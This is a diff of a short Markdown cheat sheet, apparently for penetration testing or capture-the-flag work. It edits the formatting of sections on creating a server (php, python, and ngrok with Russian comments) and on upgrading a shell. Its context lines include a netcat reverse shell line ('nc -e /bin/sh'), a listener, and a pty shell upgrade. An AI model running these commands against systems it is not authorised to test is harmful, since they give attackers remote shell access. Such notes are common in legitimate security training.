@@ -33,19 +33,25 @@ nc -e /bin/sh {IP} {port}
 reverse_shell_listener {port}
 ```
 # Create server
-
-```php
+php
+```bash
 php -S {ip}:{port}
 ```
-
-```python
+python
+```bash
 python3 -m http.server {port}
+```
+ngrok
+```bash
+// в одном терминале сначала поднимается сервер
+php -S 127.0.0.1:1234
 ```
 
 ```bash
+// в другом ngrok
 ngrok http 9001
 ```
 # Upadate shell
-```python
+```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
